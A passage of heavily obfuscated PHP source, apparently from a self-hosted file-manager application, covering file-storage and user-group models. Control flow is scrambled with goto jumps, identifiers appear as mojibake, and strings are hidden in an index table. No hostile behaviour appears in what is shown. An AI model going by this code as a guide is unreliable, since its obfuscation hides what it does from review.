$fÎ—∞«“ùØ[$fËÈÁøôÕ‘]; } public function addFileByContent($c√ÆÁä∑ß∏ = '', $CÂ Í©∞ ı = '') { goto fÕ€ü¡º¢≤; bë™àÙ¥ﬁù: $D®‘õìÇû„ = $D‚°ñ•Œﬂ . $cåâ€°£ÈÏ[2124] . rand_string(16); file_put_contents($D®‘õìÇû„, $c√ÆÁä∑ß∏); $b¬–ÃµäÎ∑ = $this->addFile($D®‘õìÇû„, $CÂ Í©∞ ı, !0); goto Aáé˘∑¬≤ÿ; Aáé˘∑¬≤ÿ: if (file_exists($D®‘õìÇû„)) { @unlink($D®‘õìÇû„); } return $b¬–ÃµäÎ∑; goto d∏ÒÒÊÖ¯€; fÕ€ü¡º¢≤: $cåâ€°£ÈÏ =& $_SERVER[—Ω]; $D‚°ñ•Œﬂ = TEMP_PATH . $cåâ€°£ÈÏ[2123]; if (!is_dir($D‚°ñ•Œﬂ)) { mk_dir($D‚°ñ•Œﬂ); } goto bë™àÙ¥ﬁù; d∏ÒÒÊÖ¯€: } public function createFileName($AÁ·Œµﬂ¨à) { goto FÈ„é€—´˘; CŒ‡˜Öâ‚Ö: $C¢äøü£ÍÁ = $C‰˜˘óÙÜî->pathFather($E‹ÿ–’§ñÙ); static $Cø≥‘«∞Æ = false; $cÆÒÎòÖ“¯ = $eÊ∂çî˜ÌÚ[2125] . md5($C¢äøü£ÍÁ); goto AÜ¥Î¥¥›£; FÈ„é€—´˘: $eÊ∂çî˜ÌÚ =& $_SERVER[—Ω]; $C‰˜˘óÙÜî = IO::init($eÊ∂çî˜ÌÚ[8]); $E‹ÿ–’§ñÙ = $this->makeFilePath($AÁ·Œµﬂ¨à, $C‰˜˘óÙÜî); goto CŒ‡˜Öâ‚Ö; AÜ¥Î¥¥›£: if (!$Cø≥‘«∞Æ && !Cache::get($cÆÒÎòÖ“¯)) { $Cø≥‘«∞Æ = !0; $CΩ•ﬁ±â∏ﬁ = IO::mkdir($C¢äøü£ÍÁ); if (!IO::exist($CΩ•ﬁ±â∏ﬁ . $eÊ∂çî˜ÌÚ[2126])) { IO::mkfile($CΩ•ﬁ±â∏ﬁ . $eÊ∂çî˜ÌÚ[2126]); } Cache::set($cÆÒÎòÖ“¯, 1, 3600 * 2); } return $E‹ÿ–’§ñÙ; goto Añùèè«Ω…; Añùèè«Ω…: } public function makeFilePath($A¡û˜ä¯ÿè, $cÉ≤Ö‡ëŒ) { goto dâí°ìºÚÎ; a–Èø‹ÀÙ„: switch ($F†î∑õàçÀ) { case $eáÉÀì»÷‹[2130]: $FÁ∂≈Ã«Ë = $FÁ∂≈Ã«Ë . $eáÉÀì»÷‹[93] . $cÉ≤Ö‡ëŒ->ext($A¡û˜ä¯ÿè); if ($cÉ≤Ö‡ëŒ->ext($A¡û˜ä¯ÿè) == $eáÉÀì»÷‹[2070]) { $FÁ∂≈Ã«Ë .= $eáÉÀì»÷‹[2131]; } break; case $eáÉÀì»÷‹[2132]: goto f∞£éﬁ¿é∏; BÊÓî‹î»√: break; goto cÉãÁˆ§∞Ü; B¢∑º’ëé‰: if ($cÉ≤Ö‡ëŒ->ext($A¡û˜ä¯ÿè) == $eáÉÀì»÷‹[2070]) { $A¡û˜ä¯ÿè .= $eáÉÀì»÷‹[2131]; } $AéÉ˘ÇÑÜ» = IO::fileNameAuto($câ“ä‰Èíü, $A¡û˜ä¯ÿè); $FÁ∂≈Ã«Ë = $câ“ä‰Èíü . $AéÉ˘ÇÑÜ»; goto BÊÓî‹î»√; f∞£éﬁ¿é∏: $c‡Ïı∂Áªñ = Model($eáÉÀì»÷‹[1092])->get($eáÉÀì»÷‹[1318]); $F®Ô÷–ÈŸ≤ = substr(md5($eáÉÀì»÷‹[1890] . $c‡Ïı∂Áªñ . date($eáÉÀì»÷‹[697])), 0, 8); $câ“ä‰Èíü = KodIO::defaultIO() . date($eáÉÀì»÷‹[2133]) . $F®Ô÷–ÈŸ≤ . $eáÉÀì»÷‹[8]; goto B¢∑º’ëé‰; cÉãÁˆ§∞Ü: case $eáÉÀì»÷‹[2129]: break; default: break; } return $FÁ∂≈Ã«Ë; goto dÓ§È®°≠®; dâí°ìºÚÎ: $eáÉÀì»÷‹ =& $_SERVER[—Ω]; $F†î∑õàçÀ = Model($eáÉÀì»÷‹[1092])->get($eáÉÀì»÷‹[2127]); $câ“ä‰Èíü = KodIO::defaultIO() . date($eáÉÀì»÷‹[2128]); goto cº¶®√¬¶Ù; cº¶®√¬¶Ù: $FÁ∂≈Ã«Ë = $câ“ä‰Èíü . rand_string(5) . short_id(100); $A¡û˜ä¯ÿè = str_replace($eáÉÀì»÷‹[8], $eáÉÀì»÷‹[70], KodIO::clear($A¡û˜ä¯ÿè)); if (!$A¡û˜ä¯ÿè) { $F†î∑õàçÀ = $eáÉÀì»÷‹[2129]; } goto a–Èø‹ÀÙ„; dÓ§È®°≠®: } public function addFileByRemote($b„•åëÇ´Ú, $a¡©¨Ò´∑ö, $Fıéêƒï ≠ = array()) { goto CÎÔÏç⁄·∑; CÎÔÏç⁄·∑: $DÇË—–ÆËÕ =& $_SERVER[—Ω]; if (!IO::exist($b„•åëÇ´Ú)) { return !1; } $CŒâ¿ËÉèÖ = $Fıéêƒï ≠[$DÇË—–ÆËÕ[160]] ? $Fıéêƒï ≠[$DÇË—–ÆËÕ[160]] : $DÇË—–ÆËÕ[33]; goto CÛüäÎπÂÔ; CÛüäÎπÂÔ: $e∫…€‰¯√Ÿ = IO::hashMd5($b„•åëÇ´Ú, $CŒâ¿ËÉèÖ); $Dí§ûµêÔ∫ = KodIO::defaultDriver(); $aı¥Û¢®¢Ó = array($DÇË—–ÆËÕ[516] => IO::size($b„•åëÇ´Ú), $DÇË—–ÆËÕ[2134] => 1, $DÇË—–ÆËÕ[383] => $a¡©¨Ò´∑ö, $DÇË—–ÆËÕ[745] => $Dí§ûµêÔ∫[$DÇË—–ÆËÕ[364]], $DÇË—–ÆËÕ[384] => $b„•åëÇ´Ú, $DÇË—–ÆËÕ[2135] => $Fıéêƒï ≠[$DÇË—–ÆËÕ[161]] ? $Fıéêƒï ≠[$DÇË—–ÆËÕ[161]] : IO::hashSimple($b„•åëÇ´Ú), $DÇË—–ÆËÕ[2136] => $e∫…€‰¯√Ÿ ? $e∫…€‰¯√Ÿ : $CŒâ¿ËÉèÖ); goto FÁÈåﬁçæß; FÁÈåﬁçæß: if ($Få‚£¿‘Õ‘ = $this->addFileCheckExist($aı¥Û¢®¢Ó[$DÇË—–ÆËÕ[161]], $aı¥Û¢®¢Ó[$DÇË—–ÆËÕ[160]], $aı¥Û¢®¢Ó[$DÇË—–ÆËÕ[77]])) { return $Få‚£¿‘Õ‘; } return $this->addFileData($aı¥Û¢®¢Ó); goto FÎÃù£ó©ë; FÎÃù£ó©ë: } private function addFileData($bô‹ˆΩÇì∂) { $A¨˜è∆ﬂçÎ =& $_SERVER[—Ω]; if (!$bô‹ˆΩÇì∂) { return !1; } $bô‹ˆΩÇì∂[$A¨˜è∆ﬂçÎ[77]] = intval($bô‹ˆΩÇì∂[$A¨˜è∆ﬂçÎ[77]]); if (!$bô‹ˆΩÇì∂[$A¨˜è∆ﬂçÎ[77]] && strlen($bô‹ˆΩÇì∂[$A¨˜è∆ﬂçÎ[161]]) > 32) { $bô‹ˆΩÇì∂[$A¨˜è∆ﬂçÎ[77]] = intval(substr($bô‹ˆΩÇì∂[$A¨˜è∆ﬂçÎ[161]], 32)); } $B˘Ó»ë∑ù¨ = $this->add($bô‹ˆΩÇì∂); return $this->find($B˘Ó»ë∑ù¨); } public function addFile($C∫è≠Û≤Ãö, $f€∞±ΩæÁ≥, $Eè¨óŒÃéº = false) { $f≈êëñéè¢ = IO::hashSimple($C∫è≠Û≤Ãö); $aœá‘£‡Øµ = IO::hashMd5($C∫è≠Û≤Ãö); $A˘ÃØ°‘˘ = IO::size($C∫è≠Û≤Ãö); if ($b·Âıí‘≠ƒ = $this->addFileCheckExist($f≈êëñéè¢, $aœá‘£‡Øµ, $A˘ÃØ°‘˘)) { return $b·Âıí‘≠ƒ; } $a›ÜÇÏçÑ≤ = $this->addFileMake($C∫è≠Û≤Ãö, $A˘ÃØ°‘˘, $f≈êëñéè¢, $aœá‘£‡Øµ, $f€∞±ΩæÁ≥, $Eè¨óŒÃéº); return $this->addFileData($a›ÜÇÏçÑ≤); } public function addFileMake($cèëí≠ﬂãΩ, $b∆® Õ ≈õ, $BØìÿâ†±, $b“©…õ«ÎŒ, $aÈ∑µÛµá‡, $aîﬁ±ÜàÍë) { goto Eˆõ˘°—£ï; eÑıËÆ’¿: $b÷Íœ‘ì≠è = get_path_this($BÇÌΩÏôïè); if ($aîﬁ±ÜàÍë) { $c⁄ì´Ω◊Îê = IO::move($cèëí≠ﬂãΩ, $d∞◊∑ˆê™˘, !1, $b÷Íœ‘ì≠è); } else { $c⁄ì´Ω◊Îê = IO::copy($cèëí≠ﬂãΩ, $d∞◊∑ˆê™˘, !1, $b÷Íœ‘ì≠è); } if (!$c⁄ì´Ω◊Îê) { return !1; } goto f›ÕñÂöú…; Eˆõ˘°—£ï: $B»™îé´ªÌ =& $_SERVER[—Ω]; $BÇÌΩÏôïè = $this->createFileName($aÈ∑µÛµá‡); $d∞◊∑ˆê™˘ = get_path_father($BÇÌΩÏôïè); goto eÑıËÆ’¿; f›ÕñÂöú…: $A∑ÖÔ◊™◊† = KodIO::defaultDriver(); $a‹‹Æ≥≈äÜ = array($B»™îé´ªÌ[516] => $b∆® Õ ≈õ, $B»™îé´ªÌ[2134] => 1, $B»™îé´ªÌ[383] => $aÈ∑µÛµá‡, $B»™îé´ªÌ[745] => $A∑ÖÔ◊™◊†[$B»™îé´ªÌ[364]], $B»™îé´ªÌ[384] => $BÇÌΩÏôïè, $B»™îé´ªÌ[2135] => $BØìÿâ†±, $B»™îé´ªÌ[2136] => $b“©…õ«ÎŒ); return $a‹‹Æ≥≈äÜ; goto B«üø™≈ˆ•; B«üø™≈ˆ•: } public function addFileCheckExist($aù‚ºÜèî∏, $cÓ⁄ØÙæú–, $Eëîëµ‚ı›) { $E€∑ùˆê£Ó =& $_SERVER[—Ω]; $F©€ ‹„•Ñ = $this->findByHash($aù‚ºÜèî∏, $cÓ⁄ØÙæú–); if (!$F©€ ‹„•Ñ) { return !1; } $FÂÈÁ«œôô = array($E€∑ùˆê£Ó[2134] => intval($F©€ ‹„•Ñ[$E€∑ùˆê£Ó[2137]]) + 1, $E€∑ùˆê£Ó[516] => $Eëîëµ‚ı›); $this->where(array($E€∑ùˆê£Ó[416] => $F©€ ‹„•Ñ[$E€∑ùˆê£Ó[415]]))->save($FÂÈÁ«œôô); return $F©€ ‹„•Ñ; } public function remove($e€ß÷åŒà) { $this->linkCountChange($e€ß÷åŒà, !1); $this->clearEmpty(); return !0; } public function linkAdd($a©ı§öï°ﬂ) { $this->linkCountChange($a©ı§öï°ﬂ, !0); } public function linkCountChange($Fıπ îØ™û, $c¢öŒªÜ‰ ) { goto fê‡ê˜ùéµ; fê‡ê˜ùéµ: $fÆ√⁄ÍÙ£í =& $_SERVER[—Ω]; if (!$Fıπ îØ™û) { return; } if (!is_array($Fıπ îØ™û)) { $Fıπ îØ™û = array($Fıπ îØ™û); } goto bﬂ˘Õ‘Çã¯; bﬂ˘Õ‘Çã¯: $bã¢î ü§Ã = array(); foreach ($Fıπ îØ™û as $DŸªÈ¯∏Ì÷) { $eÉÖØ¡øâÆ = $DŸªÈ¯∏Ì÷ . $fÆ√⁄ÍÙ£í[33]; if (!$bã¢î ü§Ã[$eÉÖØ¡øâÆ]) { $bã¢î ü§Ã[$eÉÖØ¡øâÆ] = 0; } $bã¢î ü§Ã[$eÉÖØ¡øâÆ]++; } $D⁄€îØî∞Ú = array(); goto C¬∞Ê´Ÿÿë; C¬∞Ê´Ÿÿë: foreach ($bã¢î ü§Ã as $DŸªÈ¯∏Ì÷ => $BîÕÖÍéº∑) { $eÉÖØ¡øâÆ = $BîÕÖÍéº∑ . $fÆ√⁄ÍÙ£í[33]; if (!$D⁄€îØî∞Ú[$eÉÖØ¡øâÆ]) { $D⁄€îØî∞Ú[$eÉÖØ¡øâÆ] = array(); } $D⁄€îØî∞Ú[$eÉÖØ¡øâÆ][] = $DŸªÈ¯∏Ì÷; } foreach ($D⁄€îØî∞Ú as $BîÕÖÍéº∑ => $dß…öæ÷ì ) { if (!$dß…öæ÷ì ) { continue; } $BîÕÖÍéº∑ = $c¢öŒªÜ‰  ? $BîÕÖÍéº∑ : -intval($BîÕÖÍéº∑); $fúùÒÏÿä˜ = array($fÆ√⁄ÍÙ£í[415] => array($fÆ√⁄ÍÙ£í[7], $dß…öæ÷ì )); if ($BîÕÖÍéº∑ < 0) { $fúùÒÏÿä˜[$fÆ√⁄ÍÙ£í[2137]] = array($fÆ√⁄ÍÙ£í[935], abs($BîÕÖÍéº∑)); } $this->where($fúùÒÏÿä˜)->setAdd($fÆ√⁄ÍÙ£í[2137], $BîÕÖÍéº∑); } goto C∂ƒ¿∆⁄ßÆ; C∂ƒ¿∆⁄ßÆ: } public function findByHash($FÍÜÏô∫ Í, $C°™Ø‘—Ò∞ = false) { $C©ëÂÖæøø =& $_SERVER[—Ω]; if (!$FÍÜÏô∫ Í && !$C°™Ø‘—Ò∞) { return !1; } $eìÜ›£Íñ° = array($C©ëÂÖæøø[2135] => $FÍÜÏô∫ Í); if ($C°™Ø‘—Ò∞) { $eìÜ›£Íñ° = array($C©ëÂÖæøø[2136] => $C°™Ø‘—Ò∞); } return $this->order($C©ëÂÖæøø[2138])->where($eìÜ›£Íñ°)->find(); } public function clearEmpty($D≥ÛÛËáÿ¶ = 0) { goto CÓëÏí◊Æµ; CÓëÏí◊Æµ: $BûŒΩ‹±»™ =& $_SERVER[—Ω]; $B‚ƒ†¶ò‚¶ = time() - 3600 * 24 * $D≥ÛÛËáÿ¶; $BÇä–¥€±Ò = $BûŒΩ‹±»™[2139] . $B‚ƒ†¶ò‚¶; goto AË¶»ÙÉ–É; FäåÈ‹Ô÷æ: foreach ($b‚‘¬Ïµıå as $B®¶Ÿ·“Óœ) { $Aß˘ÙïèøÜ->update(1); $this->resetFile($B®¶Ÿ·“Óœ); } $Aß˘ÙïèøÜ->end(); goto B±ú∂ØÖãÏ; AË¶»ÙÉ–É: $b‚‘¬Ïµıå = $this->where($BÇä–¥€±Ò)->select(); if (!$b‚‘¬Ïµıå) { return; } $Aß˘ÙïèøÜ = new Task($BûŒΩ‹±»™[2140], $BûŒΩ‹±»™[33], count($b‚‘¬Ïµıå)); goto FäåÈ‹Ô÷æ; B±ú∂ØÖãÏ: } private function resetFile($c‘ÇÕ„àÑ¿) { goto bï˜ΩÒ≥Œ ; bï˜ΩÒ≥Œ : $BÑËá àƒˆ =& $_SERVER[—Ω]; $BÃﬂÓ¯ÆÜ∫ = array($BÑËá àƒˆ[416] => $c‘ÇÕ„àÑ¿[$BÑËá àƒˆ[415]]); $f∫“Õ÷≥ï” = Model($BÑËá àƒˆ[1114])->where($BÃﬂÓ¯ÆÜ∫)->count(); goto aŸº⁄çßæï; aŸº⁄çßæï: $B“±ÓÑ®¨ã = Model($BÑËá àƒˆ[2141])->where($BÃﬂÓ¯ÆÜ∫)->count(); $Aπ¶Á¢àñ‚ = intval($f∫“Õ÷≥ï”) + intval($B“±ÓÑ®¨ã); if ($Aπ¶Á¢àñ‚ == 0) { IO::remove($c‘ÇÕ„àÑ¿[$BÑËá àƒˆ[75]]); $this->where($BÃﬂÓ¯ÆÜ∫)->delete(); $this->metaSet($c‘ÇÕ„àÑ¿[$BÑËá àƒˆ[415]], null, null); return; } goto a—›≥á±éﬂ; a—›≥á±éﬂ: if ($c‘ÇÕ„àÑ¿[$BÑËá àƒˆ[2137]] != $Aπ¶Á¢àñ‚) { $this->where($BÃﬂÓ¯ÆÜ∫)->save(array($BÑËá àƒˆ[2134] => $Aπ¶Á¢àñ‚)); } goto eüÉ¶ÕÇÁ≠; eüÉ¶ÕÇÁ≠: } public function storageInfo($FÂà◊ïÖ’‹ = false) { goto EÖïù„ ≥ƒ; EÖïù„ ≥ƒ: $b·∂‚ùú÷æ =& $_SERVER[—Ω]; $bï÷∆òÊ…≈ = $this->count() + 0.0; $eÉ±ﬁÿíó≠ = 0; goto FñπÀâ¿Ø€; f†Üç•ˆµ∆: for ($dÒ†ﬂ≤´≠ı = 0; $dÒ†ﬂ≤´≠ı < $bï÷∆òÊ…≈; $dÒ†ﬂ≤´≠ı = $dÒ†ﬂ≤´≠ı + $Aü“Æâ™ßÜ) { $aºÇ¬°òØù = $this->limit($dÒ†ﬂ≤´≠ı, $dÒ†ﬂ≤´≠ı + $Aü“Æâ™ßÜ)->select(); foreach ($aºÇ¬°òØù as $e˜•à¬ÑËÈ) { $dÉÜóåõòå += $e˜•à¬ÑËÈ[$b·∂‚ùú÷æ[77]] * $e˜•à¬ÑËÈ[$b·∂‚ùú÷æ[2137]]; $eÉ±ﬁÿíó≠ += $e˜•à¬ÑËÈ[$b·∂‚ùú÷æ[77]] * ($e˜•à¬ÑËÈ[$b·∂‚ùú÷æ[2137]] - 1); $a≤Üï≠ï˘Î += $e˜•à¬ÑËÈ[$b·∂‚ùú÷æ[2137]]; } } $d¯£€áŒû› = array($b·∂‚ùú÷æ[2142] => $dÉÜóåõòå, $b·∂‚ùú÷æ[2143] => $eÉ±ﬁÿíó≠, $b·∂‚ùú÷æ[2144] => $eÉ±ﬁÿíó≠ / $dÉÜóåõòå, $b·∂‚ùú÷æ[81] => $bï÷∆òÊ…≈, $b·∂‚ùú÷æ[2145] => $a≤Üï≠ï˘Î); return $d¯£€áŒû›; goto Eööˆ±’ôÜ; FñπÀâ¿Ø€: $dÉÜóåõòå = 1; $a≤Üï≠ï˘Î = 0; $Aü“Æâ™ßÜ = 5000; goto f†Üç•ˆµ∆; Eööˆ±’ôÜ: } } class GroupModel extends ModelBase { protected $tableName = "\x67\x72\x6f\165\160"; protected $tableMeta = array("\164\x61\x62\154\145\116\141\x6d\145" => "\147\x72\x6f\x75\160\137\x6d\145\x74\x61", "\x6d\145\x74\x61\x46\x69\145\x6c\x64" => "\147\162\157\165\x70\x49\104"); protected function cacheFunctionAlias($F◊£≥Ò–ì≠) { $aú·¢‡Õˆë =& $_SERVER[—Ω]; return array($aú·¢‡Õˆë[2146] => array($F◊£≥Ò–ì≠[0], $aú·¢‡Õˆë[2147]), $aú·¢‡Õˆë[2148] => array($F◊£≥Ò–ì≠[0], $aú·¢‡Õˆë[2147])); } protected function getInfo($Aóãà¬Ö¡è) { $BèﬂÑÍé¢Æ = $this->getInfoSimple($Aóãà¬Ö¡è); if (!$BèﬂÑÍé¢Æ) { return !1; } return $this->_listDataApplyItem($BèﬂÑÍé¢Æ); } protected function getInfoSimple($CŸª’»ÃûÔ, $E€õÜ∫÷àµ = false) { $F“üâﬂπä¥ =& $_SERVER[—Ω]; if ($E€õÜ∫÷àµ) { $cˆÉÖ˜¥©» = array($F“üâﬂπä¥[2080] => intval($CŸª’»ÃûÔ)); $dä—•û´« = $this->where($cˆÉÖ˜¥©»)->find(); return is_array($dä—•û´«) ? $dä—•û´« : array(); } return $this->cacheFunctionGet($F“üâﬂπä¥[2149], $CŸª’»ÃûÔ); } protected function groupAdd($d¢åùë»á“) { goto f“Ω∑∏û¢Û; a€’©áœ¡°: return $BÿÂË¿¶§Ñ; goto fÈÌ∫∏§ó√; f“Ω∑∏û¢Û: $C§Ë‚Êº∂Ã =& $_SERVER[—Ω]; if (!$d¢åùë»á“[$C§Ë‚Êº∂Ã[457]] && isset($d¢åùë»á“[$C§Ë‚Êº∂Ã[2080]]) && $d¢åùë»á“[$C§Ë‚Êº∂Ã[2080]] == 1) { if ($EΩÚÙµª§¯ = $this->getInfoSimple($d¢åùë»á“[$C§Ë‚Êº∂Ã[2080]], !0)) { return $d¢åùë»á“[$C§Ë‚Êº∂Ã[2080]]; } } else { $EΩÚÙµª§¯ = $this->getInfoSimple($d¢åùë»á“[$C§Ë‚Êº∂Ã[457]]); if (!$EΩÚÙµª§¯) { return !1; } } $aø–◊«Øé = $C§Ë‚Êº∂Ã[466]; goto B»ëáÙÜËÿ; bëùâô’Î–: $BÿÂË¿¶§Ñ = $this->add($A‡Øè›¬òñ); $this->setNamePinyin($BÿÂË¿¶§Ñ, $A‡Øè›¬òñ[$C§Ë‚Êº∂Ã[28]]); Model($C§Ë‚Êº∂Ã[1114])->groupRootAdd($BÿÂË¿¶§Ñ); goto a€’©áœ¡°; B»ëáÙÜËÿ: if ($EΩÚÙµª§¯[$C§Ë‚Êº∂Ã[455]]) { $aø–◊«Øé = $EΩÚÙµª§¯[$C§Ë‚Êº∂Ã[455]] . $EΩÚÙµª§¯[$C§Ë‚Êº∂Ã[2080]] . $C§Ë‚Êº∂Ã[47]; } $A‡Øè›¬òñ = array($C§Ë‚Êº∂Ã[383] => $this->groupNameAuto($d¢åùë»á“[$C§Ë‚Êº∂Ã[457]], $d¢åùë»á“[$C§Ë‚Êº∂Ã[28]]), $C§Ë‚Êº∂Ã[365] => $d¢åùë»á“[$C§Ë‚Êº∂Ã[457]], $C§Ë‚Êº∂Ã[521] => $aø–◊«Øé, $C§Ë‚Êº∂Ã[2150] => $d¢åùë»á“[$C§Ë‚Êº∂Ã[2064]], $C§Ë‚Êº∂Ã[2151] => 0, $C§Ë‚Êº∂Ã[2084] => 0); if (!empty($d¢åùë»á“[$C§Ë‚Êº∂Ã[2080]])) { $A‡Øè›¬òñ[$C§Ë‚Êº∂Ã[2080]] = $d¢åùë»á“[$C§Ë‚Êº∂Ã[2080]]; } goto bëùâô’Î–; fÈÌ∫∏§ó√: } protected function groupEdit($eã‹Ï˜ﬂøä, $aøè«òä°ﬂ) { $b∫‚ âÈÃ∆ =& $_SERVER[—Ω]; if (!empty($aøè«òä°ﬂ[$b∫‚ âÈÃ∆[457]])) { $B—Ÿﬁ€ıø¨ = $this->getInfoSimple($eã‹Ï˜ﬂøä); $Cº„ˆı§∫… = $this->getInfoSimple($aøè«òä°ﬂ[$b∫‚ âÈÃ∆[457]]); if (!$B—Ÿﬁ€ıø¨ || !$Cº„ˆı§∫…) { return !1; } if ($B—Ÿﬁ€ıø¨[$b∫‚ âÈÃ∆[2080]] == $Cº„ˆı§∫…[$b∫‚ âÈÃ∆[2080]]) { return !1; } if ($aøè«òä°ﬂ[$b∫‚ âÈÃ∆[457]] != $B—Ÿﬁ€ıø¨[$b∫‚ âÈÃ∆[457]]) { if ($Cº„ˆı§∫…[$b∫‚ âÈÃ∆[455]] !== $B—Ÿﬁ€ıø¨[$b∫‚ âÈÃ∆[455]] && strpos($Cº„ˆı§∫…[$b∫‚ âÈÃ∆[455]], $B—Ÿﬁ€ıø¨[$b∫‚ âÈÃ∆[455]] . $B—Ÿﬁ€ıø¨[$b∫‚ âÈÃ∆[2080]] . $b∫‚ âÈÃ∆[47]) === 0) { return !1; } $aøè«òä°ﬂ[$b∫‚ âÈÃ∆[521]] = $Cº„ˆı§∫…[$b∫‚ âÈÃ∆[455]] . $aøè«òä°ﬂ[$b∫‚ âÈÃ∆[457]] . $b∫‚ âÈÃ∆[47]; $this->_changeChildLevel($B—Ÿﬁ€ıø¨, $Cº„ˆı§∫…); } } if (isset($aøè«òä°ﬂ[$b∫‚ âÈÃ∆[28]])) { $this->setNamePinyin($eã‹Ï˜ﬂøä, $aøè«òä°ﬂ[$b∫‚ âÈÃ∆[28]]); } return $this->where(array($b∫‚ âÈÃ∆[2152] => $eã‹Ï˜ﬂøä))->save($aøè«òä°ﬂ); } private function _changeChildLevel($F∞⁄ÏåãÁÜ, $F‹Ñ‡πΩ≥†, $b•é¯Ì‹õù = false) { goto Däá€ï∑ﬁÂ; BÈ€àÙëÓ : if ($b•é¯Ì‹õù) { $E¨á≈—±öë = $F‹Ñ‡πΩ≥†[$d√˜ÏŒÃ€‰[455]] . $F‹Ñ‡πΩ≥†[$d√˜ÏŒÃ€‰[2080]] . $d√˜ÏŒÃ€‰[47]; } $D°íú¶Ï¡˘ = array($d√˜ÏŒÃ€‰[521] => array($d√˜ÏŒÃ€‰[479], $F∞⁄ÏåãÁÜ[$d√˜ÏŒÃ€‰[455]] . $F∞⁄ÏåãÁÜ[$d√˜ÏŒÃ€‰[2080]] . $d√˜ÏŒÃ€‰[480])); $d≈∂úä¿îç = array($d√˜ÏŒÃ€‰[521] => array($d√˜ÏŒÃ€‰[530], "\x72\x65\160\x6c\x61\x63\145\50\160\x61\x72\145\x6e\x74\x4c\145\166\145\x6c\54\47{$C¶ÒùìèΩı}\47\x2c\47{$E¨á≈—±öë}\47\x29")); goto EãÑË´•¨; EãÑË´•¨: $this->where($D°íú¶Ï¡˘)->data($d≈∂úä¿îç)->save(); goto aÉ¥íç÷˜◊; Däá€ï∑ﬁÂ: $d√˜ÏŒÃ€‰ =& $_SERVER[—Ω]; $C¶ÒùìèΩı = $F∞⁄ÏåãÁÜ[$d√˜ÏŒÃ€‰[455]] . $F∞⁄ÏåãÁÜ[$d√˜ÏŒÃ€‰[2080]] . $d√˜ÏŒÃ€‰[47]; $E¨á≈—±öë = $F‹Ñ‡πΩ≥†[$d√˜ÏŒÃ€‰[455]] . $F‹Ñ‡πΩ≥†[$d√˜ÏŒÃ€‰[2080]] . $d√˜ÏŒÃ€‰[47] . $F∞⁄ÏåãÁÜ[$d√˜ÏŒÃ€‰[2080]] . $d√˜ÏŒÃ€‰[47]; goto BÈ€àÙëÓ ; aÉ¥íç÷˜◊: } public function setNamePinyin($BÀÇÏ‡ê∆“, $aæΩä—Óß = false) { $aèÉ∫ê’ïê =& $_SERVER[—Ω]; if (!$aæΩä—Óß) { $bŸàáëÒ∏ù = $this->getInfoSimple($BÀÇÏ‡ê∆“); $aæΩä—Óß = $bŸàáëÒ∏ù[$aèÉ∫ê’ïê[28]]; } if (!Input::check($aæΩä—Óß, $aèÉ∫ê’ïê[524])) { $this->metaSet($BÀÇÏ‡ê∆“, $aèÉ∫ê’ïê[412], null); $this->metaSet($BÀÇÏ‡ê∆“, $aèÉ∫ê’ïê[411], null); return; } $AÈÍç¨˘ê∞ = array($aèÉ∫ê’ïê[412] => str_replace($aèÉ∫ê’ïê[50], $aèÉ∫ê’ïê[33], Pinyin::encode($aæΩä—Óß)), $aèÉ∫ê’ïê[411] => Pinyin::encode($aæΩä—Óß, $aèÉ∫ê’ïê[525])); $this->metaSet($BÀÇÏ‡ê∆“, $AÈÍç¨˘ê∞); } protected function groupRemove($Eπê€áŒ¥û) { goto fÓ–™≠ë´•; bÌÇÁ¥Ú∏: Model($eãàπîˆ¬÷[762])->groupRootRemove($Eπê€áŒ¥û); return $this->where($cﬂà≈áê≥ﬂ)->delete(); goto f⁄£◊íÀÊ¬; a¬›ëâı–ä: $this->where(array($eãàπîˆ¬÷[457] => $Eπê€áŒ¥û))->save(array($eãàπîˆ¬÷[457] => $EÕ™Ï¥◊çÌ[$eãàπîˆ¬÷[457]])); Model($eãàπîˆ¬÷[2153])->where($cﬂà≈áê≥ﬂ)->delete(); Model($eãàπîˆ¬÷[2154])->where($cﬂà≈áê≥ﬂ)->delete(); goto bÌÇÁ¥Ú∏; fÓ–™≠ë´•: $eãàπîˆ¬÷ =& $_SERVER[—Ω]; $cﬂà≈áê≥ﬂ = array($eãàπîˆ¬÷[2080] => $Eπê€áŒ¥û); $EÕ™Ï¥◊çÌ = $this->where($cﬂà≈áê≥ﬂ)->find(); goto f˜¯≈ﬁŸîø; f˜¯≈ﬁŸîø: if (!$EÕ™Ï¥◊çÌ || $EÕ™Ï¥◊çÌ[$eãàπîˆ¬÷[457]] == 0) { return !1; } $Cµ˜∏ÁØÒ¿ = $this->getInfoSimple($EÕ™Ï¥◊çÌ[$eãàπîˆ¬÷[457]]); $this->_changeChildLevel($EÕ™Ï¥◊çÌ, $Cµ˜∏ÁØÒ¿, !0); goto a¬›ëâı–ä; f⁄£◊íÀÊ¬: } public function listData() { $b—†’‚∫õ± = $this->_makeOrder()->selectPage(50); $this->_listDataApply($b—†’‚∫õ±[$_SERVER[—Ω][351]]); return $b—†’‚∫õ±; } private function _makeOrder($d§ÇÇ»ñ·ü = '') { goto A¿ˆπºÓÜã; f§≈ãÿ∫È€: $cíÚ◊ıñ∆ = Input::get($bƒŒ„√Ë«∆[403], $bƒŒ„√Ë«∆[7], $bƒŒ„√Ë«∆[2152], $c’’Ò¢ˆÈ„); $e·ﬂãç∏ô€ = Input::get($bƒŒ„√Ë«∆[404], $bƒŒ„√Ë«∆[7], $bƒŒ„√Ë«∆[2155], array($bƒŒ„√Ë«∆[2155], $bƒŒ„√Ë«∆[400])); $e·ﬂãç∏ô€ = $Dêè‰“‰Õ€[$e·ﬂãç∏ô€]; goto b¡ö©¢®™ ; b¡ö©¢®™ : $d§ÇÇ»ñ·ü = $d§ÇÇ»ñ·ü . "{$cíÚ◊ıñ∆}\x20{$e·ﬂãç∏ô€}\x2c\40\x67\x72\x6f\165\160\111\x44\x20\141\x73\143"; return $this->order($d§ÇÇ»ñ·ü); goto E∏èä«¥˘ò; A¿ˆπºÓÜã: $bƒŒ„√Ë«∆ =& $_SERVER[—Ω]; $c’’Ò¢ˆÈ„ = array($bƒŒ„√Ë«∆[2080], $bƒŒ„√Ë«∆[28], $bƒŒ„√Ë«∆[2066], $bƒŒ„√Ë«∆[184]); $Dêè‰“‰Õ€ = array($bƒŒ„√Ë«∆[398] => $bƒŒ„√Ë«∆[399], $bƒŒ„√Ë«∆[400] => $bƒŒ„√Ë«∆[401]); goto f§≈ãÿ∫È€; E∏èä«¥˘ò: } public function listChild($Eﬂ„ØÎƒà) { $BÒ¬»ñÇ∏ç =& $_SERVER[—Ω]; $b…¢éÀ⁄Ùó = 